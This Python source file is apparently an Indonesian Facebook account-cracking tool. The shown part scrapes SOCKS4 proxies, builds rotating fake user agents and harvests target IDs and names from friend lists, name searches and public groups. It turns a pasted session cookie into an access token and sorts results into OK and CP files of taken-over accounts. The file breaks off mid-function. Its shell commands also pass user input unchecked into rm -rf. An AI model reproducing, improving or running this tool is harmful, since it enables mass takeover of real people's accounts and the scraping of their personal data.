# import module
import os
try:
  import rich
except ImportError:
  print('\t• Sedang Menginstall Module Rich •')
  os.system('pip install rich')
try:
  import stdiomask
except ImportError:
  print('\t• Sedang Menginstall Module Stdiomask •')
  os.system('pip install stdiomask')
try:
  import bs4
except ImportError:
  print('\t• Sedang Menginstall Module bs4 •')
  os.system('pip install bs4')
try:
  import requests
except ImportError:
  print('\t• Sedang Menginstall Modul Requests •')
  os.system('pip install requests && pip install mechanize')

import requests,bs4,json,sys,random,datetime,time,re,rich,base64,os,subprocess
from time import time as tm
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as bs
from rich import print as gubluk_print
from rich.tree import Tree
from rich.console import Console
from rich.panel import Panel as pan
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

# color
PU = '\x1b[1;97m' # PUTIH
ME = '\x1b[1;91m' # MERAH
HI = '\x1b[1;92m' # HIJAU
KU = '\x1b[1;93m' # KUNING
BI = '\x1b[1;94m' # BIRU
UNS = '\x1b[1;95m' # UNGU
BM = '\x1b[1;96m' # BIRU MUDA
WM = '\x1b[0m'	# WARNA MATI
sir = '\033[41m\x1b[1;97m'
DE = '\33[m' # DEFAULT
RE = '\x1b[1;91m' #RED +
KT = '\033[93m' # KUNING +
HT = '\x1b[1;92m' # HIJAU +
HM = '\033[32m' # HIJAU -
UN = '\033[95m' # UNGU
KM = '\033[33m' # KUNING -
BMM = '\33[1;96m' # BIRU -
BT = '\x1b[0;34m' # BIRU +

id,id2,akun,tokenme,uid,method,pwpluss,pwnya= [],[],[],[],[],[],[],[]
myugen,ugen,ugen2,ndy,uafl,ualu,ualuh=[],[],[],[],[],[],[]

# info device
try:device_os = subprocess.check_output("getprop ro.oppo.market.name",shell=True).decode("utf-8").replace("\n","")
except:device_os = "-"
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")

# proxy
try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
except Exception as e:
  print(f' {ME}[+] No Internet');exit()
prox=open('.prox.txt','r').read().splitlines()

# date
day = datetime.datetime.now().strftime("%d-%b-%Y")
mon = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = mon[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okNdyZ = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpNdyZ = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# User-Agent
for xd in range(1000):
    rr = random.randint
    rc = random.choice
    xio = str(random.randint(4,18))+"_{str(rr(1,9))}"
    android = str(random.randint(10,13))
    fblc = str(random.choice(['en_GB','en_US','es_MX','th_TH','pl_PL','id_ID','hi_IN','bg_BG','uk_UA','ru_RU','fr_FR','es_ES','pt_PT','it_IT','bn_IN']))
    oph = random.choice(["Katana-Android","Adsmanager-Android","Facebook.lite-Android","Orca-Android","Facebook.mlite-Android","MessengerLite"])
    opk = random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite"])
    fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata','TNT','AIS','Airtel','AXISNET','Bouygues Telecom','T-Mobile']))
    uanyaa = f"Dalvik/2.1.0 (Linux; Android 9; SM-J730G Build/PPR1.{str(rr(111111,299999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,150))}.0.{str(rr(4000,5900))}.{str(rr(70,150))} Mobile Safari/537.36 [FBAN/EMA;FBLC/{fblc};FBAV/{str(rr(100,400))}.0.0.{str(rr(5,20))}.{str(rr(70,200))};]"
    if uanyaa in ugen2:pass
    else:ugen2.append(uanyaa)
    
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
    if ugent1 in ugen:pass
    else:ugen.append(ugent1)
    ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; Redmi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
    if ugent2 in ugen:pass
    else:ugen.append(ugent2)
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
    if ugent3 in ugen:pass
    else:ugen.append(ugent3)
    
# cracking
class Facebook():
  def __init__(self):
    self.ses = requests.Session()
    self.loop,self.ok,self.cp = 0,0,0
    self.login()
  
  def ndyzz_machine(self, tx):
    for e in tx + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
  def back(self):
    self.login()
    
  def tahun(self, fx):
    if len(fx) == 15:
      if fx[:10] in ['1000000000'] :tahunz = '√ 2009'
      elif fx[:9] in ['100000000'] :tahunz = '√ 2009'
      elif fx[:8] in ['10000000'] :tahunz = '√ 2009'
      elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '√ 2009'
      elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '√ 2010'
      elif fx[:6] in ['100001'] :tahunz = '√ 2010-2011'
      elif fx[:6] in ['100002','100003'] :tahunz = '√ 2011-2012'
      elif fx[:6] in ['100004'] :tahunz = '√ 2012-2013'
      elif fx[:6] in ['100005','100006'] :tahunz = '√ 2013-2014'
      elif fx[:6] in ['100007','100008'] :tahunz = '√ 2014-2015'
      elif fx[:6] in ['100009'] :tahunz = '√ 2015'
      elif fx[:5] in ['10001'] :tahunz = '√ 2015-2016'
      elif fx[:5] in ['10002'] :tahunz = '√ 2016-2017'
      elif fx[:5] in ['10003'] :tahunz = '√ 2018'
      elif fx[:5] in ['10004'] :tahunz = '√ 2019'
      elif fx[:5] in ['10005'] :tahunz = '√ 2020'
      elif fx[:5] in ['10006','10007','10008']:tahunz = '√ 2021-2022'
      elif fx[:5] in ['10009'] :tahunz = '√ 2023'
      else :tahunz = 'lol'
    elif len(fx) in [9,10]:tahunz = '√ 2008-2009'
    elif len(fx) == 8:tahunz = '√ 2007-2008'
    elif len(fx) == 7:tahunz = '√ 2006-2007'
    else :tahunz = ''
    return tahunz
  
  # logo
  def banner(self):
    gubluk_print(panel(f"""[bold purple]
 __    _            ______          [bold cyan]Author   : [bold green]NdyZz[bold purple]
|  \  | |    _ __  |___  |____      [bold cyan]Github   : [bold green]github.com/-[bold purple]
|   \ | | __| |\ \/ / / /___  |     [bold cyan]WhatsApp : [bold green]6285346923840[bold purple]
| |\ \| |/    | \  / / /   / /      [bold cyan]Update   : [bold green]21-Jul-2023[bold purple]
| | \   | (_| |_/ / / /___/ /___    [bold cyan]Status   : [bold red]mokad[bold purple]
|_|  \__|\____|__/ /_____|_____|    [bold cyan]Version  : [bold green]1.0.0[bold white]
        """,width=80,padding=(0,2),title=f"[bold green]Banner-NdyZz",style=f"bold purple"))
  
  # login
  def login(self):
    try:
      token = open('.token.txt','r').read()
      coke = open('.cok.txt','r').read()
      tokenme.append(token)
      try:
        sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenme[0], cookies={'cookie':coke})
        sy2 = json.loads(sy.text)['name']
        sy3 = json.loads(sy.text)['id']
        self.menu(sy2,sy3)
      except KeyError:
        print(f'\n{ME} [+] Coki Udah Mokad');time.sleep(1)
        os.system('rm -rf .cok.txt && rm -rf .token.txt')
        self.loginNdyZz()
      except requests.exceptions.ConnectionError:
        print(f'{ME} [+] Problem Internet Connection, Check And Try Again');time.sleep(1);exit()
    except IOError:
      self.loginNdyZz()
  
  def loginNdyZz(self):
    os.system('clear')
    self.banner()
    gubluk_print(panel(f"[bold white][[bold cyan]01[bold white]] Login Cookie\n[[bold cyan]02[bold white]] Crack File\n[[bold cyan]03[bold white]] Result",width=50,title=f"[bold green]Menu",padding=(0,2),style=f"bold purple"))
    inp_NdyZ = input(f'{BMM}┌──[{KT}Opsi Menu{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if inp_NdyZ in ['1','01']:
      self.login_cokiNdyZ()
    elif inp_NdyZ in ['2','02']:
      self.Ndy_FromFl_dump()
    elif inp_NdyZ in ['3','03']:
      self.result()
    else:
      print(' [+] Pilih Yang Bener ')
      time.sleep(5)
      exit()
  
  def login_cokiNdyZ(self):
    try:
      gubluk_print(pan('[bold white]saran extension cokiedough/get token cookie\nsaran cookie fresh dan bukan akun baru\n\nketik "c" tutorial get cookie',width=50,padding=(0,2),style=f"bold purple"))
      your_coki = input(f'{BMM}┌──[{KT}Cookie{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
      if your_coki in['c','C']:
        os.system('xdg-open https://youtu.be/i2Wk1UKOtNg');exit()
      else:
        self.ses.headers.update(
          {
          'content-type': 'application/x-www-form-urlencoded',
          }
        )
        data = {
          'access_token':'1348564698517390|007c0a9101b9e1c8ffab727666805038',
          'scope': ''
        }
        response = json.loads(self.ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
        code, user_code = response['code'], response['user_code']
        verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
        self.ses.headers.pop(
          'content-type'
        )
        self.ses.headers.update(
          {
            'sec-fetch-mode': 'navigate',
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
            'sec-fetch-site': 'cross-site',
            'Host': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-dest': 'document',
          }
        )
        response2 = self.ses.get(verification_url, cookies = {'cookie': your_coki}).text
        if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
          exit(f'\n {ME}[!] cookie invalid')
        else:
          action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
          fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
          jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
          data = {
            'fb_dtsg': fb_dtsg,
            'jazoest': jazoest,
            'qr': 0,
            'user_code': user_code,
          }
          self.ses.headers.update(
            {
              'origin': 'https://m.facebook.com',
              'referer': verification_url,
              'content-type': 'application/x-www-form-urlencoded',
              'sec-fetch-site': 'same-origin',
            }
          )
          response3 = self.ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_coki})
          if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
            self.ses.headers.pop(
              'content-type'
            )
            self.ses.headers.pop(
              'origin'
            )
            response4 = self.ses.post(response3.url, data = data, cookies = {'cookie': your_coki}).text
            action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
            fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
            jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
            scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
            display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
            user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
            logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
            auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
            encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
            return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
            self.ses.headers.update(
              {
                'origin': 'https://m.facebook.com',
                'referer': response3.url,
                'content-type': 'application/x-www-form-urlencoded',
              }
            )
            data = {
              'fb_dtsg': fb_dtsg,
              'jazoest': jazoest,
              'scope': scope,
              'display': display,
              'user_code': user_code,
              'logger_id': logger_id,
              'auth_type': auth_type,
              'encrypted_post_body': encrypted_post_body,
              'return_format[]': return_format,
            }
            response5 = self.ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_coki}).text
            windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
            self.ses.headers.pop(
              'content-type'
            )
            self.ses.headers.pop(
              'origin'
            )
            self.ses.headers.update(
              {
                'referer': 'https://m.facebook.com/',
              }
            )
            response6 = self.ses.get(windows_referer, cookies = {'cookie': your_coki}).text
            if 'Sukses!' in str(response6):
              self.ses.headers.update(
                {
                  'sec-fetch-mode': 'no-cors',
                  'referer': 'https://graph.facebook.com/',
                  'Host': 'graph.facebook.com',
                  'accept': '*/*',
                  'sec-fetch-dest': 'script',
                  'sec-fetch-site': 'cross-site',
                }
              )
              response7 = self.ses.get(status_url, cookies = {'cookie': your_coki}).text
              access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
              tokenw = open(".token.txt", "w").write(access_token)
              cokiew = open(".cok.txt", "w").write(your_coki)
              print(f'\n{HI}your token: {DE}'+access_token)
              print(f'\n{HI}login berhasil, jalankan {ME}python NdyZz.py{DE}')
          else:
            exit('\n[+] login gagal')
    except Exception as e:
      print(f'\n{ME} [+] Coki Invalid')
      os.system('rm -rf .cok.txt && rm -rf .token.txt')
      print(e)
      exit()
  
  # menu
  def menu(self, my_name, my_id):
    try:
      token = open('.token.txt','r').read()
      cok = open('.cok.txt','r').read()
    except IOError:
      print(f'{ME} [+] Coki Kadaluarsa ')
      time.sleep(5)
      self.login()
    os.system('clear')
    self.banner()
    gubluk_print(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\t\t[bold white][+[/][bold white]][/] [bold white]Device : [bold green]{device_os}[/]\n[bold white][+[/][bold white]][/] [bold white]Id       : [bold green]{my_id}[/]\t\t[bold white][+[/][bold white]][/] [bold white]Sim Card : [bold green]{simcard}[/]',width=80,padding=(0,2),title=f"[bold green]Profile User",style=f"bold purple"))
    gubluk_print(panel(f"[bold white][[bold cyan]01[bold white]] Crack Public\n[bold white][[bold cyan]02[bold white]] Crack Massal[bold white]\n[bold white][[bold cyan]03[bold white]] Crack File[bold white]\n[bold white][[bold cyan]04[bold white]] Crack Nama[bold white]\n[bold white][[bold cyan]05[bold white]] Crack Group[bold white]\n[bold white][[bold cyan]06[bold white]] Result[bold white]\n[[bold cyan]00[bold white]] [bold red]Delete Coki[bold white]",width=35,title=f"[bold green]List Menu",style=f"bold purple"))
    _NdyZz = input(f'{BMM}┌──[{KT}Opsi Crack{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if _NdyZz in ['1','01']:
      self.Ndy_FromFr_dump()
    elif _NdyZz in ['2','02']:
      self.Ndy_FromMs_dump()
    elif _NdyZz in ['3','03']:
      self.Ndy_FromFl_dump()
    elif _NdyZz in ['4','04']:
      self.Ndy_FromNm_dump()
    elif _NdyZz in ['5','05']:
      self.Ndy_FromGb_dump()
    elif _NdyZz in ['6','06']:
      self.result()
    elif _NdyZz in ['0','00']:
      os.system('rm -rf .token.txt')
      os.system('rm -rf .cookie.txt')
      print(f' {ME}[+] Sukses Logout/Hapus Coki')
      self.login()
    else:
      print(f'{ME} [+] Pilih Yang Bener ')
      exit()
  
  # dump friends
  def Ndy_FromFr_dump(self):
    try:
      token = open('.token.txt','r').read()
      kukis = open('.cok.txt','r').read()
    except IOError:
      exit()
    gubluk_print(panel('[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=80,padding=(0,5),style='bold purple'))
    id.clear()
    pil = input(f'{BMM}┌──[{KT}Id Target{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    try:
      koH = requests.get('https://graph.facebook.com/v17.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenme[0],cookies={'cookie': kukis}).json()
      for pi in koH['friends']['data']:
        try:id.append(pi['id']+'|'+pi['name'])
        except:continue
      print(f' [+] Total ID : '+str(len(id)))
      self.setting()
    except requests.exceptions.ConnectionError:
      print(f'{ME} [+] Tidak ada Internet')
      exit()
    except (KeyError,IOError):
      print(f' {ME}[+] Pertemanan Tidak Publik Atau Coki dan Token Anda Busuk')
      exit()
  
  # dump friends massal
  def Ndy_FromMs_dump(self):
    try:
      token = open('.token.txt','r').read()
      cok = open('.cok.txt','r').read()
    except IOError:
      exit()
    try:
      gubluk_print(panel('[bold white]Ketik [bold green]me[/] Jika Ingin Crack Pertemanan Sendiri',width=80,padding=(0,8),title=f"[bold green]Crack Massal",style=f"bold purple"))
      id.clear()
      jum = int(input(f'{BMM}┌──[{KT}Jumlah target{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}'))
    except ValueError:
      print(f'{ME} [+] Wrong input ')
      exit()
    if jum<1 or jum>80:
      print(f'{ME} [+] Pertemanan Tidak Publik')
      exit()
    yz = 0
    for met in range(jum):
      yz+=1
      kl = input(f'{BMM}┌──[{KT}Target{BMM}]-[{KT}'+str(yz)+f'{BMM}]\n└─> {DE}')
      uid.append(kl)
    for userr in uid:
      try:
        col = self.ses.get('https://graph.facebook.com/v17.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenme[0], cookies = {'cookies':cok}).json()
        for mi in col['friends']['data']:
          try:
            iso = (mi['id']+'|'+mi['name'])
            if iso in id:pass
            else:id.append(iso)
          except:continue
      except (KeyError,IOError):
        pass
      except requests.exceptions.ConnectionError:
        print(f'{ME} [+] koneksi bermasalah')
        exit()
    try:
      print(f' [+] Total Idz Target : '+str(len(id)))
      self.setting()
    except requests.exceptions.ConnectionError:
      print(f'{ME} [+] koneksi bermasalah')
      exit()
    except (KeyError,IOError):
      print(f'{ME} [+] teman tidak publik ')
      time.sleep(3)
      exit()
  
  # dump from file
  def Ndy_FromFl_dump(self):
    try:lst = os.listdir('DUMP-NdyZz')
    except FileNotFoundError:
      print(f'{ME} [+] File Tidak Ditemukan ')
      time.sleep(2)
      self.back()
    if len(lst)==0:
      print(f'{ME} [+] Kamu Tidak Memiliki File Dump ')
      print(f'{PU} [+] Silahkan buat file dump terlebih dahulu di dalam folder DUMP-NdyZz \n [+] contoh:{HI} nama file: nama.txt\n             format dump : id|nama{DE}');time.sleep(2)
      exit()
    else:
      cih = 0
      lol = {}
      for isi in lst:
        try:hem = open('DUMP-NdyZz/'+isi,'r').readlines()
        except:continue
        cih+=1
        if cih<100:
          nom = '0'+str(cih)
          lol.update({str(cih):str(isi)})
          lol.update({nom:str(isi)})
          gubluk_print(panel(f'[bold white][[bold cyan]%s[bold white]]. %s ( [bold yellow]%s id [bold white])'%(nom,isi,len(hem)),width=50,padding=(0,2),title=f"[bold green]File Dump",style=f"bold purple"))
        else:
          lol.update({str(cih):str(isi)})
          print(PU+'['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+DE)
          gubluk_print(panel(f' %s. %s ({HI} %s {DE}id) '%(cih,isi,len(hem)),width=50,padding=(0,2),title=f"[bold green]Set Urutan Id",style=f"bold purple"))
      id.clear()
      geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
      try:geh = lol[geeh]
      except KeyError:
        print(f'{ME} [+] Pilih Yang Bener {DE}')
        time.sleep(3)
        self.back()
      try:
        lin = open('DUMP-NdyZz/'+geh,'r').read().splitlines()
      except:
        print(f'{ME} [+] File Tidak Ditemukan, Coba Lagi Nanti ')
        time.sleep(2)
        self.back()
      for xid in lin:
        id.append(xid)
      self.setting()
  
  # dump from nama
  def Ndy_FromNm_dump(self):
    try:
      gubluk_print(panel('[bold white]beri koma sebagai pemisah jika target lebih dari satu, contoh: [bold green]nama1,nama2[/]\n[bold green]CTRL+C[bold white] untuk stop[/]',width=80,padding=(0,2),title=f"[bold green]Crack Nama",style=f"bold purple"))
      nama = []
      blkng = [" andi"," xyz"," niken"," bone"," koe"," sinta"," ahmad"," muhammad"," cinta"," kakak"," adek"," sayang"," bapak"," ibu"," indonesia"," official"," kami"," batam"," medan"," new"," old"," jakarta"," makassar"," sinjai"," girl"," boy"," cewek"," cowok"]
      dpn = ["andi ","xyz ","niken ","bone ","koe ","sinta ","ahmad ","muhammad ","cinta ","kakak ","adek ","sayang ","bapak ","ibu ","indonesia ","official ","kami ","batam ","medan ","new ","old ","jakarta ","makassar ","sinjai ","girl ","boy ","cewek ","cowok "]
      named = input(f'{BMM}┌──[{KT}Nama Target{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}').split(",")
      for lsnm in named:		
      	for belakang in blkng:
      		id = lsnm+belakang
      		nama.append(id)
      	for depan in dpn:
      		id = depan+lsnm
      		nama.append(id)
      for id in nama:
        link=f'https://mbasic.facebook.com/public/{id}?/locale2=id_ID'
        self.cari_nama(link)
    except KeyboardInterrupt:
      pass
    print('\n');self.setting()

  def cari_nama(self, link):
    cokies=open('.cok.txt','r').read()
    try:
      htmls = parser(self.ses.get(link, cookies={'cookie': cokies}).text, 'html.parser')
      for x in htmls.find_all('td'):
            data = re.findall('<a\ href="/(.*?)"><div\ class=".*?"><div\ class=".*?">(.*?)<\/div>', str(x))
            for uid, nama in data:
              if 'profile.php?' in uid:
                uid = re.findall('id=(.*)', uid)[0].split('&')[0]
              elif '<span' in nama:
                nama = re.findall('(.*?)\<', nama)[0]
              uid = uid.split('?')[0]
              bos = uid + '|' + nama
              if bos[:3] =='100':
                if bos not in id:id.append(bos)
                else:pass
      href_el = htmls.find('a',string='Lihat Hasil Selanjutnya', href=True)
      if href_el:
        sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Id ...")
        sys.stdout.flush()
        time.sleep(0.0000003)
        link = href_el['href']
        self.cari_nama(link)
      else:
        pass
    except AttributeError:
      pass
  
  # dump from grub publik
  def Ndy_FromGb_dump(self):
    try:
      try:
        cokies = open('.cok.txt','r').read()
      except IOError:
        print(f'{ME} [+] Cookies Kadaluarsa ')
        time.sleep(5)
        exit()
      gubluk_print(panel('[bold white]beri koma sebagai pemisah jika target lebih dari satu, contoh: [bold green]Id1,Id2[/]\n[bold green]CTRL+C[bold white] untuk stop[/]',width=80,padding=(0,2),title=f"[bold green]Crack Group",style=f"bold purple"))
      urlgb = input(f'{BMM}┌──[{KT}Id Group{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}').split(",")
      for url in urlgb:
        self.dumpGb("https://mbasic.facebook.com/groups/"+url,cokies)
    except KeyboardInterrupt:
      pass
    print('\n');self.setting()
  
  def dumpGb(self, url, cokies):
    try:
      data = parser(self.ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
      judul = re.findall("<title>(.*?)</title>",str(data))[0]
      if str(judul) == 'Use basic mode':
        print(f'\n{ME} [+] Cokies Berada Dalam Mode Free');exit()
      if str(judul) == 'Epsilon':
        print(f'\n{ME} [+] Cokies Tidak Dpt Mengakses Grup');exit()
      if str(judul) == 'Kesalahan':
        print(f'\n{ME} [+] Cokies Yg Anda Masukan Salah');exit()
      if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
        print(f'\n{ME} [+] Cokies Mokad');exit()
      else:
        for isi in data.find_all("h3"):
          for ids in isi.find_all("a",href=True):
            if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
            else:
              if ids.text==judul:pass
              else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
            losn = uid+"|"+nama
            if losn in id:pass
            else:id.append(losn)
            print('\r [+] Mengumpulkan %s Id'%(len(id)),end='')
        for x in data.find_all("a",href=True):
          if "Lihat Postingan Lainnya" in x.text:
            self.dumpGb("https://mbasic.facebook.com"+x.get("href"),cokies)
    except KeyboardInterrupt:
      pass
  
  # ua from file
  def ugen_file(self):
    gubluk_print(panel(f'[bold white]Buat file list ua di dalam folder UA-ME[/]',width=50,padding=(0,2),title=f"[bold white][/][bold green]List UA File[/][bold white][/]",style=f"bold purple"))
    try:ndy = os.listdir('UA-ME')
    except FileNotFoundError:
      print(f'{ME} [+] Folder Tidak Di Temukan ')
      time.sleep(3)
      exit()
    if len(ndy)==0:
      print(f'{ME} [+] Anda Tidak Memiliki file list ua')
      time.sleep(3)
      exit()
    else:
      cih = 0
      lol = {}
      for isi in ndy:
        try:hem = open('UA-ME/'+isi,'r').readlines()
        except:continue
        cih+=1
        if cih<10:
          nom = '0'+str(cih)
          lol.update({str(cih):str(isi)})
          lol.update({nom:str(isi)})
          xpr = f'\t{PU}['+nom+'] '+isi+' [ '+str(len(hem))+' User-Agent ]'+DE
          print(xpr)
        else:
          lol.update({str(cih):str(isi)})
          xpr = f'\t{PU}['+str(cih)+'] '+isi+' [ '+str(len(hem))+' User-Agent ]'+DE
          print(xpr)
      geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
      try:geh = lol[geeh]
      except KeyError:
        print(f'{ME} [+] Pilih Yang Bener ')
        exit()
      try:lin = open('UA-ME/'+geh,'r').read().splitlines()
      except:
        print(f'{ME} [+] File Tidak Di Temukan ')
        time.sleep(4)
        exit()
      user=0
      for cpku in range(len(lin)):
        uraaa=lin[user]
        myugen.append(uraaa)
        user +=1
  
  # result
  def result(self):
    try:vin = os.listdir('CP');licp = str(len(vin))
    except FileNotFoundError:licp = '0'
    try:vin = os.listdir('OK');liok = str(len(vin))
    except FileNotFoundError:liok = '0'
    gubluk_print(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Cek Hasil [bold green]OK[bold white] ( [bold yellow]{liok} File [bold white])[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Cek Hasil [bold yellow]CP[bold white] ( [bold yellow]{licp} File [bold white])[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Delete Hasil [bold green]OK[bold white] ( [bold yellow]{liok} File [bold white])[/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Delete Hasil [bold yellow]CP[bold white] ( [bold yellow]{licp} File [bold white])[/]',width=50,padding=(0,2),title=f"[bold white][/][bold green]Result[/][bold white][/]",style=f"bold purple"))
    kz = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
    if kz in ['1','01']:
        self.cek_okResult()
    elif kz in ['2','02']:
        self.cek_cpResult()
    elif kz in ['3','03']:
        self.del_okResult()
    elif kz in ['4','04']:
        self.del_cpResult()
    else:
        print(f'{ME} [+] Pilih Yang Bener');exit()
        
  def del_cpResult(self):
      try:vin = os.listdir('CP')
      except FileNotFoundError:
        print(' [+] File Tidak Di Temukan ')
        time.sleep(3)
        pass
      if len(vin)==0:
        print(' [+] Anda Tidak Memiliki Hasil CP ')
        time.sleep(4)
        pass
      else:
        cih = 0
        lol = {}
        for isi in vin:
          try:hem = open('CP/'+isi,'r').readlines()
          except:continue
          cih+=1
          if cih<10:
            nom = '0'+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
          elif cih>10 and cih<80:
            nom = ''+str(cih)
            lol.update({str(cih):str(isi)})
            lol.update({nom:str(isi)})
            print(f'\t{PU}['+nom+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
          else:
            lol.update({str(cih):str(isi)})
            print(f'\t{PU}['+str(cih)+'] '+isi+f' [ {KT}'+str(len(hem))+f' Account {PU}]{DE}')
        geeh = input(f'{BMM}┌──[{KT}Opsi{BMM}]-[{KT}NdyZz{BMM}]\n└─> {DE}')
        try:geh = lol[geeh]
        except KeyError:
          print(f'{ME} [+] Pilih Yang Bener ')
          exit()
        try:os.system('rm -rf CP/'+geh);print(f'{HI} [+] succes deleted {geh}')
        except:os.system('rm CP/'+geh);print(f'{HI} [+] succes deleted {geh}')
  
  def del_okResult(self):
      try:vin = os.listdir('OK')
      except FileNotFoundError:
        print(f'{ME} [+] File Tidak Di Temukan ')
        time.sleep(4)
        pass
      if len(vin)==0:
        print(f'{ME} [+] Anda Tidak Mempunyai File OK ')
        time.sleep(4)
        pass
      else:
        cih = 0
        lol = {}
        for isi in vin:
          try:hem = open('OK/'+isi,'r').readlines()
          except:continue
          cih+=1
          if cih<10:
            nom = '0'+str(cih)
